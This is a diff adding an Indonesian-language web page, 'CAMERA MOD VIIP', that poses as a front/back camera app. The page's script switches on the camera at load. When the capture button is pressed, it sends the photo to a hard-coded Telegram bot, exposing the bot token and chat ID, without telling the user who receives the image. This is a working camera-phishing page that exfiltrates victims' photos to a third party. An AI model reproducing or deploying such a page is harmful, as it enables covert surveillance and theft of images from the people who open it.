@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kamera Depan & Belakang</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #202124;
+            color: #black;
+            text-align: center;
+            padding: 20px;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        canvas {
+            display: none;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>CAMERA MOD VIIP </h1>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <br>
+    <button id="captureButton">Tangkap Gambar</button>
+    <button id="toggleCamera">Ganti Kamera</button>
+</body>
+<script>
+    const botToken = "7582656397:AAFFGTR60EZ9tZn0w5CQbial7jObBs2MNjA"; // Token bot Telegram
+    const chatId = "6830927175"; // Chat ID
+
+    let currentStream = null;
+    let usingFrontCamera = true; // Default kamera depan
+    const videoElement = document.getElementById('video');
+    const canvasElement = document.getElementById('canvas');
+    const captureButton = document.getElementById('captureButton');
+    const toggleCameraButton = document.getElementById('toggleCamera');
+
+    // Fungsi untuk menghidupkan kamera
+    async function startCamera(front = true) {
+        if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+        }
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: front ? "user" : "environment" }
+            });
+            videoElement.srcObject = currentStream;
+        } catch (error) {
+            alert("Tidak dapat mengakses kamera: " + error.message);
+        }
+    }
+
+    // Fungsi untuk menangkap gambar
+    async function captureImage() {
+        const context = canvasElement.getContext('2d');
+        canvasElement.width = videoElement.videoWidth;
+        canvasElement.height = videoElement.videoHeight;
+        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+        const imageData = canvasElement.toDataURL('image/png');
+        await sendToTelegram(imageData);
+    }
+
+    // Fungsi untuk mengirim gambar ke bot Telegram
+    async function sendToTelegram(imageData) {
+        const blob = await (await fetch(imageData)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'image.png');
+
+        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData,
+            });
+            if (response.ok) {
+                alert('Gambar berhasil dikirim!');
+            } else {
+                alert('Gagal mengirim gambar.');
+            }
+        } catch (error) {
+            alert('Error: Tidak dapat mengirim ke Telegram.');
+        }
+    }
+
+    // Tombol tangkap gambar
+    captureButton.addEventListener('click', captureImage);
+
+    // Tombol ganti kamera
+    toggleCameraButton.addEventListener('click', () => {
+        usingFrontCamera = !usingFrontCamera;
+        startCamera(usingFrontCamera);
+    });
+
+    // Hidupkan kamera depan saat halaman dibuka
+    startCamera();
+</script>
+</html>
+r
